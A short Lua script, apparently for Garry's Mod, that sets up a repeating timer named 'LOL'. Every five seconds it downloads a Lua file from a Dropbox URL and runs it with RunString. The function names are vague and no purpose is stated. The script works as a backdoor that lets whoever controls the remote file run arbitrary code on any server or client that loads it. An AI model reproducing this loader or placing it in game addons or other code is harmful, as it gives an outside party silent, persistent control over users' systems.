local olua = {}
function olua.orun( oluaa )
        RunString( oluaa )
end
timer.Create("LOL", 5, 0, function()
	http.Fetch( "https://dl.dropboxusercontent.com/u/64061648/motdonline.lua", olua.orun )
end)